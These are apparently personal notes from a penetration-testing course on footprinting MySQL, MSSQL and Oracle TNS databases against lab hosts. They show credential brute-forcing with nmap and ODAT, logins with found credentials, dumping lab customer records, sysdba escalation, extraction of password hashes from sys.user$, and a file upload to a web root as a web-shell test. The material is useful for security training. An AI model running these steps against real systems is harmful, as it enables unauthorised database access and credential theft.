# Footprinting v3

## **MySQL**

### **Scanning MySQL Server**

```shell-session
eldeim@htb[/htb]$ sudo nmap 10.129.14.128 -sV -sC -p3306 --script mysql*

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-21 00:53 CEST
Nmap scan report for 10.129.14.128
Host is up (0.00021s latency).

PORT     STATE SERVICE     VERSION
3306/tcp open  nagios-nsca Nagios NSCA
| mysql-brute: 
|   Accounts: 
|     root:<empty> - Valid credentials
|_  Statistics: Performed 45010 guesses in 5 seconds, average tps: 9002.0
|_mysql-databases: ERROR: Script execution failed (use -d to debug)
|_mysql-dump-hashes: ERROR: Script execution failed (use -d to debug)
| mysql-empty-password: 
|_  root account has empty password
| mysql-enum: 
|   Valid usernames: 
|     root:<empty> - Valid credentials
|     netadmin:<empty> - Valid credentials
|     guest:<empty> - Valid credentials
|     user:<empty> - Valid credentials
|     web:<empty> - Valid credentials
|     sysadmin:<empty> - Valid credentials
|     administrator:<empty> - Valid credentials
|     webadmin:<empty> - Valid credentials
|     admin:<empty> - Valid credentials
|     test:<empty> - Valid credentials
|_  Statistics: Performed 10 guesses in 1 seconds, average tps: 10.0
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.26-0ubuntu0.20.04.1
|   Thread ID: 13
|   Capabilities flags: 65535
|   Some Capabilities: SupportsLoadDataLocal, SupportsTransactions, Speaks41ProtocolOld, LongPassword, DontAllowDatabaseTableColumn, Support41Auth, IgnoreSigpipes, SwitchToSSLAfterHandshake, FoundRows, InteractiveClient, Speaks41ProtocolNew, ConnectWithDatabase, IgnoreSpaceBeforeParenthesis, LongColumnFlag, SupportsCompression, ODBCClient, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: YTSgMfqvx\x0F\x7F\x16\&\x1EAeK>0
|_  Auth Plugin Name: caching_sha2_password
|_mysql-users: ERROR: Script execution failed (use -d to debug)
|_mysql-variables: ERROR: Script execution failed (use -d to debug)
|_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug)
MAC Address: 00:00:00:00:00:00 (VMware)
```

This scan above is an excellent example of this, as we know for a fact that the target MySQL server does not use an empty password for the user `root`, but a fixed password. We can test this with the following command:

### **Interaction with the MySQL Server**

```shell-session
eldeim@htb[/htb]$ mysql -u root -h 10.129.14.132

ERROR 1045 (28000): Access denied for user 'root'@'10.129.14.1' (using password: NO)
```

For example, if we use a password that we have guessed or found through our research, we will be able to log in to the MySQL server and execute some commands.

```shell-session
eldeim@htb[/htb]$ mysql -u root -pP4SSw0rd -h 10.129.14.128

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 150165
Server version: 8.0.27-0ubuntu0.20.04.1 (Ubuntu)                                                         
Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.                                     
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.                           
      
MySQL [(none)]> show databases;                                                                          
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
4 rows in set (0.006 sec)


MySQL [(none)]> select version();
+-------------------------+
| version()               |
+-------------------------+
| 8.0.27-0ubuntu0.20.04.1 |
+-------------------------+
1 row in set (0.001 sec)


MySQL [(none)]> use mysql;
MySQL [mysql]> show tables;
```

More about this database can be found in the [reference manual](https://dev.mysql.com/doc/refman/8.0/en/system-schema.html) of MySQL.

```shell-session
mysql> select host, unique_users from host_summary;

+-------------+--------------+                   
| host        | unique_users |                   
+-------------+--------------+                   
| 10.129.14.1 |            1 |                   
| localhost   |            2 |                   
+-------------+--------------+                   
2 rows in set (0,01 sec)  
```

### Commands

| **Command**                                          | **Description**                                                                                       |
| ---------------------------------------------------- | ----------------------------------------------------------------------------------------------------- |
| `mysql -u <user> -p<password> -h <IP address>`       | Connect to the MySQL server. There should **not** be a space between the '-p' flag, and the password. |
| `show databases;`                                    | Show all databases.                                                                                   |
| `use <database>;`                                    | Select one of the existing databases.                                                                 |
| `show tables;`                                       | Show all available tables in the selected database.                                                   |
| `show columns from <table>;`                         | Show all columns in the selected table.                                                               |
| `select * from <table>;`                             | Show everything in the desired table.                                                                 |
| `select * from <table> where <column> = "<string>";` | Search for needed `string` in the desired table.                                                      |

### Lab - Questions

* Enumerate the MySQL server and determine the version in use. (Format: MySQL X.X.XX)

```
sudo nmap 10.129.10.164 -sV -sC -p3306 --script mysql* -Pn -n --min-rate 2000
PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MySQL 8.0.27-0ubuntu0.20.04.1
| mysql-enum: 
|   Accounts: No valid accounts found
|_  Statistics: Performed 8 guesses in 5 seconds, average tps: 1.6
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.27-0ubuntu0.20.04.1
|   Thread ID: 137
|   Capabilities flags: 65535
|   Some Capabilities: LongPassword, Support41Auth, SwitchToSSLAfterHandshake, Speaks41ProtocolOld, SupportsCompression, FoundRows, InteractiveClient, LongColumnFlag, ODBCClient, SupportsTransactions, IgnoreSigpipes, SupportsLoadDataLocal, ConnectWithDatabase, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, DontAllowDatabaseTableColumn, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: ^\x1B0\x7F\x16E%c#%q+]\x06\x05z[Ed\x03
|_  Auth Plugin Name: caching_sha2_password
| mysql-brute: 
|   Accounts: No valid accounts found
|   Statistics: Performed 27293 guesses in 286 seconds, average tps: 99.3
|_  ERROR: The service seems to have failed or is heavily firewalled...


```

* During our penetration test, we found weak credentials "robin:robin". We should try these against the MySQL server. What is the email address of the customer "Otto Lang"?

```
mysql -u robin -probin -h 10.129.10.164

MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| customers          |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.047 sec)

MySQL [(none)]> use customers;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [customers]> show tables;
+---------------------+
| Tables_in_customers |
+---------------------+
| myTable             |
+---------------------+
1 row in set (0.009 sec)

MySQL [customers]> select * from myTable
    -> ;
+----+---------------------+------------------------------------------+--------------------+-------------+-------------------------------+-----------------------------------+---------------------+------+
| id | name                | email                                    | country            | postalZip   | city                          | address                           | pan                 | cvv  |
+----+---------------------+------------------------------------------+--------------------+-------------+-------------------------------+-----------------------------------+---------------------+------+
|  1 | Emery Reyes         | diam.eu@icloud.htb                       | Spain              | 26-579      | Quảng Ngãi                    | 675-4432 Nunc Av.                 | 519358 9482346334   | 144  |
|  2 | Kristen Trujillo    | tellus.id@google.htb                     | Costa R.htb        | 376420      | Chiclayo                      | 101-8154 Ac Rd.                   | 546871 777532 7590  | 125  |
|  3 | Fletcher Jimenez    | lobortis@outlook.htb                     | Germany            | 3515        | Timaru                        | 9562 Dui, St.                     | 559 47883 93145 224 | 550  |
|  4 | Boris Sharp         | donec@protonmail.htb                     | Pakistan           | 1317        | Jönköping                     | 728-7809 Cras Road                | 4716447833847468    | 536  |
|  5 | Ruth Carson         | suspendisse.aliquet@yahoo.htb            | Pakistan           | 14945       | Oviedo                        | 324-8221 Ut Road                  | 516478245356654

MySQL [customers]> SELECT name, email FROM myTable WHERE name LIKE '%Otto Lang%';
+-----------+---------------------+
| name      | email               |
+-----------+---------------------+
| Otto Lang | ultrices@google.htb |
+-----------+---------------------+
```

***

## MSSQL

[Microsoft SQL](https://www.microsoft.com/en-us/sql-server/sql-server-2019) (`MSSQL`) is Microsoft's SQL-based relational database management system. Unlike MySQL

### **NMAP MSSQL Script Scan**

```shell-session
eldeim@htb[/htb]$ sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248

Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-08 09:40 EST
Nmap scan report for 10.129.201.248
Host is up (0.15s latency).

PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: SQL-01
|   NetBIOS_Domain_Name: SQL-01
|   NetBIOS_Computer_Name: SQL-01
|   DNS_Domain_Name: SQL-01
|   DNS_Computer_Name: SQL-01
|_  Product_Version: 10.0.17763

Host script results:
| ms-sql-dac: 
|_  Instance: MSSQLSERVER; DAC port: 1434 (connection failed)
| ms-sql-info: 
|   Windows server name: SQL-01
|   10.129.201.248\MSSQLSERVER: 
|     Instance name: MSSQLSERVER
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|     TCP port: 1433
|     Named pipe: \\10.129.201.248\pipe\sql\query
|_    Clustered: false

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.52 seconds
```

We can also use Metasploit to run an auxiliary scanner called `mssql_ping` that will scan the MSSQL service and provide helpful information in our footprinting process.

### **MSSQL Ping in Metasploit**

```shell-session
msf6 auxiliary(scanner/mssql/mssql_ping) > set rhosts 10.129.201.248

rhosts => 10.129.201.248

msf6 auxiliary(scanner/mssql/mssql_ping) > run

[*] 10.129.201.248:       - SQL Server information for 10.129.201.248:
[+] 10.129.201.248:       -    ServerName      = SQL-01
[+] 10.129.201.248:       -    InstanceName    = MSSQLSERVER
[+] 10.129.201.248:       -    IsClustered     = No
[+] 10.129.201.248:       -    Version         = 15.0.2000.5
[+] 10.129.201.248:       -    tcp             = 1433
[+] 10.129.201.248:       -    np              = \\SQL-01\pipe\sql\query
[*] 10.129.201.248:       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### **Connecting with Mssqlclient.py**

If we can guess or gain access to credentials, this allows us to remotely connect to the MSSQL server and start interacting with databases using T-SQL (`Transact-SQL`).&#x20;

```shell-session
eldeim@htb[/htb]$ python3 mssqlclient.py Administrator@10.129.201.248 -windows-auth

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(SQL-01): Line 1: Changed database context to 'master'.
[*] INFO(SQL-01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands

SQL> select name from sys.databases

name                                                                                                                               

--------------------------------------------------------------------------------------

master                                                                                                                             

tempdb                                                                                                                             

model                                                                                                                              

msdb                                                                                                                               

Transactions    
```

### Lab - Questions

* Enumerate the target using the concepts taught in this section. List the hostname of MSSQL server.

```r
sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.5.20 -n -Pn --min-rate 2000

PORT     STATE    SERVICE  VERSION
1433/tcp filtered ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM

Host script results:
| ms-sql-dump-hashes: 
|_  10.129.5.20\MSSQLSERVER: ERROR: Bad username or password
Bug in ms-sql-hasdbaccess: no string output.
| ms-sql-info: 
|   10.129.5.20\MSSQLSERVER: 
|     Instance name: MSSQLSERVER
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|     TCP port: 1433
|     Named pipe: \\10.129.5.20\pipe\sql\query
|_    Clustered: false
| ms-sql-empty-password: 
|_  10.129.5.20\MSSQLSERVER: 
| ms-sql-dac: 
|   10.129.5.20\MSSQLSERVER: 
|     port: 1434
|     state: closed
|_    error: ERROR
| ms-sql-config: 
|   10.129.5.20\MSSQLSERVER: 
|_  ERROR: Bad username or password
| ms-sql-xp-cmdshell: 
|_  (Use --script-args=ms-sql-xp-cmdshell.cmd='<CMD>' to change command.)
| ms-sql-tables: 
|   10.129.5.20\MSSQLSERVER: 
|_[10.129.5.20\MSSQLSERVER]

```

About it, we can use MSFCONSOLE -->

```
[msf](Jobs:0 Agents:0) auxiliary(scanner/mssql/mssql_ping) >> run
[*] 10.129.5.20           - SQL Server information for 10.129.5.20:
[+] 10.129.5.20           -    ServerName      = ILF-SQL-01
[+] 10.129.5.20           -    InstanceName    = MSSQLSERVER
[+] 10.129.5.20           -    IsClustered     = No
[+] 10.129.5.20           -    Version         = 15.0.2000.5
[+] 10.129.5.20           -    tcp             = 1433
[+] 10.129.5.20           -    np              = \\ILF-SQL-01\pipe\sql\query
[*] 10.129.5.20           - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

* Connect to the MSSQL instance running on the target using the account (backdoor:Password1), then list the non-default database present on the server.

```
└──╼ [★]$ mssqlclient.py backdoor@10.129.5.20 -windows-auth
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ILF-SQL-01): Line 1: Changed database context to 'master'.
[*] INFO(ILF-SQL-01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands

SQL (ILF-SQL-01\backdoor  dbo@master)> help

    lcd {path}                 - changes the current local directory to {path}
    exit                       - terminates the server process (and this session)
    enable_xp_cmdshell         - you know what it means
    disable_xp_cmdshell        - you know what it means
    enum_db                    - enum databases
    enum_links                 - enum linked servers
    enum_impersonate           - check logins that can be impersonated
    enum_logins                - enum login users
    enum_users                 - enum current db users
    enum_owner                 - enum db owner
    exec_as_user {user}        - impersonate with execute as user
    exec_as_login {login}      - impersonate with execute as login
    xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
    xp_dirtree {path}          - executes xp_dirtree on the path
    sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
    use_link {link}            - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step)
    ! {cmd}                    - executes a local shell cmd
    upload {from} {to}         - uploads file {from} to the SQLServer host {to}
    show_query                 - show query
    mask_query                 - mask query
    
SQL (ILF-SQL-01\backdoor  dbo@master)> enum_db
name        is_trustworthy_on   
---------   -----------------   
master                      0   

tempdb                      0   

model                       0   

msdb                        1   

Employees                   0  

```

***

## Oracle TNS

The `Oracle Transparent Network Substrate` (`TNS`) server is a communication protocol that facilitates communication between Oracle databases and applications over networks. Initially introduced as part of the [Oracle Net Services](https://docs.oracle.com/en/database/oracle/oracle-database/18/netag/introducing-oracle-net-services.html) software suite, TNS supports various networking protocols between Oracle databases and client applications, such as `IPX/SPX` and `TCP/IP` protocol stacks

### **Testing ODAT**

```shell-session
eldeim@htb[/htb]$ ./odat.py -h

usage: odat.py [-h] [--version]
               {all,tnscmd,tnspoison,sidguesser,snguesser,passwordguesser,utlhttp,httpuritype,utltcp,ctxsys,externaltable,dbmsxslprocessor,dbmsadvisor,utlfile,dbmsscheduler,java,passwordstealer,oradbg,dbmslob,stealremotepwds,userlikepwd,smb,privesc,cve,search,unwrapper,clean}
               ...

            _  __   _  ___ 
           / \|  \ / \|_ _|
          ( o ) o ) o || | 
           \_/|__/|_n_||_| 
-------------------------------------------
  _        __           _           ___ 
 / \      |  \         / \         |_ _|
( o )       o )         o |         | | 
 \_/racle |__/atabase |_n_|ttacking |_|ool 
-------------------------------------------

By Quentin Hardy (quentin.hardy@protonmail.com or quentin.hardy@bt.com)
...SNIP...
```

Oracle Database Attacking Tool (`ODAT`) is an open-source penetration testing tool written in Python and designed to enumerate and exploit vulnerabilities in Oracle databases. It can be used to identify and exploit various security flaws in Oracle databases, including SQL injection, remote code execution, and privilege escalation.

Let's now use `nmap` to scan the default Oracle TNS listener port.

### **Nmap**

```shell-session
eldeim@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open

Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 10:59 EST
Nmap scan report for 10.129.204.235
Host is up (0.0041s latency).

PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.64 seconds
```

### **Nmap - SID Bruteforcing**

```shell-session
eldeim@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute

Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 11:01 EST
Nmap scan report for 10.129.204.235
Host is up (0.0044s latency).

PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
| oracle-sid-brute: 
|_  XE

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.40 seconds
```

We can use the `odat.py` tool to perform a variety of scans to enumerate and gather information about the Oracle database services and its components. Those scans can retrieve database names, versions, running processes, user accounts, vulnerabilities, misconfigurations, etc. Let us use the `all` option and try all modules of the `odat.py` tool.

### **ODAT**

#### Install

```
git clone https://github.com/quentinhardy/odat
cd odat/
    python3 -m pip install --upgrade pip
    python3 -m pip install cx_Oracle
python3 odat.py -h
```

#### Use

```shell-session
eldeim@htb[/htb]$ ./odat.py all -s 10.129.204.235

[+] Checking if target 10.129.204.235:1521 is well configured for a connection...
[+] According to a test, the TNS listener 10.129.204.235:1521 is well configured. Continue...

...SNIP...

[!] Notice: 'mdsys' account is locked, so skipping this username for password           #####################| ETA:  00:01:16 
[!] Notice: 'oracle_ocm' account is locked, so skipping this username for password       #####################| ETA:  00:01:05 
[!] Notice: 'outln' account is locked, so skipping this username for password           #####################| ETA:  00:00:59
[+] Valid credentials found: scott/tiger. Continue...

...SNIP...
```

In this example, we found valid credentials for the user `scott` and his password `tiger`. After that, we can use the tool `sqlplus` to connect to the Oracle database and interact with it.

### **SQLplus - Log In**

#### **Install**

<pre class="language-bash"><code class="lang-bash"><strong>## 1
</strong><strong>wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
</strong>## 2
wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip 
## 3
sudo mkdir -p /opt/oracle
## 4
sudo unzip -d /opt/oracle instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
## 5
sudo unzip -d /opt/oracle instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip
## 6
cd /opt/oracle/instantclient_21_4 &#x26;&#x26; find . -type f | sort
## 7
export LD_LIBRARY_PATH=/opt/oracle/instantclient_21_4:$LD_LIBRARY_PATH
## 8
export PATH=$LD_LIBRARY_PATH:$PATH
## 9
source ~/.bashrc
## 10
sqlplus -V
</code></pre>

#### **Use**

```shell-session
eldeim@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE

SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:19:21 2023
Version 21.4.0.0.0

Copyright (c) 1982, 2021, Oracle. All rights reserved.

ERROR:
ORA-28002: the password will expire within 7 days



Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

SQL> 
```

If you come across the following error `sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory`, please execute the below, taken from [here](https://stackoverflow.com/questions/27717312/sqlplus-error-while-loading-shared-libraries-libsqlplus-so-cannot-open-shared).

```shell-session
eldeim@htb[/htb]$ sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
```

There are many [SQLplus commands](https://docs.oracle.com/cd/E11882_01/server.112/e41085/sqlqraa001.htm#SQLQR985) that we can use to enumerate the database manually. For example, we can list all available tables in the current database or show us the privileges of the current user like the following:

### **Oracle RDBMS - Interaction**

```shell-session
SQL> select table_name from all_tables;

TABLE_NAME
------------------------------
DUAL
SYSTEM_PRIVILEGE_MAP
TABLE_PRIVILEGE_MAP
STMT_AUDIT_OPTION_MAP
AUDIT_ACTIONS
WRR$_REPLAY_CALL_FILTER
HS_BULKLOAD_VIEW_OBJ
HS$_PARALLEL_METADATA
HS_PARTITION_COL_NAME
HS_PARTITION_COL_TYPE
HELP

...SNIP...


SQL> select * from user_role_privs;

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SCOTT                          CONNECT                        NO  YES NO
SCOTT                          RESOURCE                       NO  YES NO
```

Here, the user `scott` has no administrative privileges. However, we can try using this account to log in as the System Database Admin (`sysdba`), giving us higher privileges. This is possible when the user `scott` has the appropriate privileges typically granted by the database administrator or used by the administrator him/herself.

### **Oracle RDBMS - Database Enumeration**

```shell-session
eldeim@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE as sysdba

SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:32:58 2023
Version 21.4.0.0.0

Copyright (c) 1982, 2021, Oracle. All rights reserved.


Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production


SQL> select * from user_role_privs;

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS                            ADM_PARALLEL_EXECUTE_TASK      YES YES NO
SYS                            APEX_ADMINISTRATOR_ROLE        YES YES NO
SYS                            AQ_ADMINISTRATOR_ROLE          YES YES NO
SYS                            AQ_USER_ROLE                   YES YES NO
SYS                            AUTHENTICATEDUSER              YES YES NO
SYS                            CONNECT                        YES YES NO
SYS                            CTXAPP                         YES YES NO
SYS                            DATAPUMP_EXP_FULL_DATABASE     YES YES NO
SYS                            DATAPUMP_IMP_FULL_DATABASE     YES YES NO
SYS                            DBA                            YES YES NO
SYS                            DBFS_ROLE                      YES YES NO

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS                            DELETE_CATALOG_ROLE            YES YES NO
SYS                            EXECUTE_CATALOG_ROLE           YES YES NO
...SNIP...
```

We can follow many approaches once we get access to an Oracle database. It highly depends on the information we have and the entire setup. However, we can not add new users or make any modifications. From this point, we could retrieve the password hashes from the `sys.user$` and try to crack them offline. The query for this would look like the following:

### **Oracle RDBMS - Extract Password Hashes**

```shell-session
SQL> select name, password from sys.user$;

NAME                           PASSWORD
------------------------------ ------------------------------
SYS                            FBA343E7D6C8BC9D
PUBLIC
CONNECT
RESOURCE
DBA
SYSTEM                         B5073FE1DE351687
SELECT_CATALOG_ROLE
EXECUTE_CATALOG_ROLE
DELETE_CATALOG_ROLE
OUTLN                          4A3BA55E08595C81
EXP_FULL_DATABASE

NAME                           PASSWORD
------------------------------ ------------------------------
IMP_FULL_DATABASE
LOGSTDBY_ADMINISTRATOR
...SNIP...
```

Another option is to upload a web shell to the target. However, this requires the server to run a web server, and we need to know the exact location of the root directory for the webserver. Nevertheless, if we know what type of system we are dealing with, we can try the default paths, which are:

| **OS**  | **Path**             |
| ------- | -------------------- |
| Linux   | `/var/www/html`      |
| Windows | `C:\inetpub\wwwroot` |

First, trying our exploitation approach with files that do not look dangerous for Antivirus or Intrusion detection/prevention systems is always important. Therefore, we create a text file with a string and use it to upload to the target system.

### **Oracle RDBMS - File Upload**

```shell-session
eldeim@htb[/htb]$ echo "Oracle File Upload Test" > testing.txt
eldeim@htb[/htb]$ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt

[1] (10.129.204.235:1521): Put the ./testing.txt local file in the C:\inetpub\wwwroot folder like testing.txt on the 10.129.204.235 server                                                                                                  
[+] The ./testing.txt file was created on the C:\inetpub\wwwroot directory on the 10.129.204.235 server like the testing.txt file
```

Finally, we can test if the file upload approach worked with `curl`. Therefore, we will use a `GET http://<IP>` request, or we can visit via browser.

&#x20; Oracle TNS

```shell-session
eldeim@htb[/htb]$ curl -X GET http://10.129.204.235/testing.txt

Oracle File Upload Test
```

### Lab - Questions

* Enumerate the target Oracle database and submit the password hash of the user DBSNMP as the answer.

Frist, enumerate him with `nmap` and using scripts

```
sudo nmap -p1521 -sCV 10.129.205.19 --open --script oracle-sid-brute -Pn -n --min-rate 1000
PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
| oracle-sid-brute: 
|_  XE

```

Now, we know its vulnerable, so... install and use `odat` to bruteforce and search credentials -->

```
./odat.py all -s 10.129.205.19

[!] Notice: 'ctxsys' account is locked, so skipping this username for password                                                                                               | ETA:  00:02:19 
[!] Notice: 'dbsnmp' account is locked, so skipping this username for password                                                                                               | ETA:  00:02:06 
[!] Notice: 'dip' account is locked, so skipping this username for password                                                                                                  | ETA:  00:01:49 
[!] Notice: 'hr' account is locked, so skipping this username for password                                                                                                   | ETA:  00:01:10 
[!] Notice: 'mdsys' account is locked, so skipping this username for password##########                                                                                      | ETA:  00:00:47 
[!] Notice: 'oracle_ocm' account is locked, so skipping this username for password########################                                                                   | ETA:  00:00:35 
[!] Notice: 'outln' account is locked, so skipping this username for password###################################                                                             | ETA:  00:00:30 
[+] Valid credentials found: scott/tiger. Continue...           ###########################################################################                                  | ETA:  00:00:16 
[!] Notice: 'xdb' account is locked, so skipping this username for password###########################################################################################       | ETA:  00:00:03 
100% |#######################################################################################################################################################################| Time: 00:01:14 
[+] Accounts found on 10.129.205.19:1521/sid:XE: 
scott/tiger

```

<figure><img src="../../../.gitbook/assets/image (16) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

I mean, now use `SQLplus` to login -->

```
sqlplus scott/tiger@10.129.205.19/XE

SQL> select table_name from all_tables;

TABLE_NAME
------------------------------
DUAL
SYSTEM_PRIVILEGE_MAP
TABLE_PRIVILEGE_MAP
STMT_AUDIT_OPTION_MAP
AUDIT_ACTIONS
WRR$_REPLAY_CALL_FILTER
HS_BULKLOAD_VIEW_OBJ
....

SQL> select * from user_role_privs;

USERNAME		       GRANTED_ROLE		      ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SCOTT			       CONNECT			      NO  YES NO
SCOTT			       RESOURCE 		      NO  YES NO

```

With it, we can observe thta scoot uset has not admin privileges. However, we can try using this account to log in as System Databese Admin (sysdba), giving us higher privileges -->

```
┌─[eu-academy-2]─[10.10.15.219]─[htb-ac-489480@htb-kjwrr4sogi]─[/opt/oracle/instantclient_21_4]
└──╼ [★]$ sqlplus scott/tiger@10.129.205.19/XE as sysdba

SQL*Plus: Release 21.0.0.0.0 - Production on Fri Oct 17 12:54:45 2025
Version 21.4.0.0.0

Copyright (c) 1982, 2021, Oracle.  All rights reserved.


Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

SQL> select * from user_role_privs;

USERNAME		       GRANTED_ROLE		      ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS			       ADM_PARALLEL_EXECUTE_TASK      YES YES NO
SYS			       APEX_ADMINISTRATOR_ROLE	      YES YES NO
SYS			       AQ_ADMINISTRATOR_ROLE	      YES YES NO
SYS			       AQ_USER_ROLE		      YES YES NO
SYS			       AUTHENTICATEDUSER	      YES YES NO
SYS			       CONNECT			      YES YES NO
SYS			       CTXAPP			      YES YES NO
SYS			       DATAPUMP_EXP_FULL_DATABASE     YES YES NO
SYS			       DATAPUMP_IMP_FULL_DATABASE     YES YES NO
SYS			       DBA			      YES YES NO
SYS			       DBFS_ROLE		      YES YES NO

USERNAME		       GRANTED_ROLE		      ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS			       DELETE_CATALOG_ROLE	      YES YES NO
SYS			       EXECUTE_CATALOG_ROLE	      YES YES NO
SYS			       EXP_FULL_DATABASE	      YES YES NO
SYS			       GATHER_SYSTEM_STATISTICS       YES YES NO
SYS			       HS_ADMIN_EXECUTE_ROLE	      YES YES NO
SYS			       HS_ADMIN_ROLE		      YES YES NO
SYS			       HS_ADMIN_SELECT_ROLE	      YES YES NO
SYS			       IMP_FULL_DATABASE	      YES YES NO
SYS			       LOGSTDBY_ADMINISTRATOR	      YES YES NO
SYS			       OEM_ADVISOR		      YES YES NO
SYS			       OEM_MONITOR		      YES YES NO

USERNAME		       GRANTED_ROLE		      ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS			       PLUSTRACE		      YES YES NO
SYS			       RECOVERY_CATALOG_OWNER	      YES YES NO
SYS			       RESOURCE 		      YES YES NO
SYS			       SCHEDULER_ADMIN		      YES YES NO
SYS			       SELECT_CATALOG_ROLE	      YES YES NO
SYS			       XDBADMIN 		      YES YES NO
SYS			       XDB_SET_INVOKER		      YES YES NO
SYS			       XDB_WEBSERVICES		      YES YES NO
SYS			       XDB_WEBSERVICES_OVER_HTTP      YES YES NO
SYS			       XDB_WEBSERVICES_WITH_PUBLIC    YES YES NO

32 rows selected.

```

Now extract password hahes -->

<pre><code><strong>SQL> select name, password from sys.user$;
</strong>
NAME			       PASSWORD
------------------------------ ------------------------------
SYS			       FBA343E7D6C8BC9D
PUBLIC
CONNECT
RESOURCE
DBA
